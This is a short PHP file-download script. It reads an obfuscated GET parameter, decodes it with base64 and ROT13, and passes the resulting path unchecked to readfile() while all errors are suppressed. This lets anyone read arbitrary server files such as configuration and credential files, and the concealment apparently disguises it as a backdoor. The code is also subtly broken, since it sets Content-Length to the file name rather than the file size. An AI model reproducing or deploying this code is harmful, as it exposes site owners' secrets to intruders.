<?php
error_reporting(0);
$file=str_rot13(base64_decode($_GET["fkdPOisd"]));
header("Cache-Control: private");
header("Content-Type: application/stream");
header("Content-Length: ".basename($file));
header("Content-Disposition: attachment; filename=".$file);
readfile($file);
?>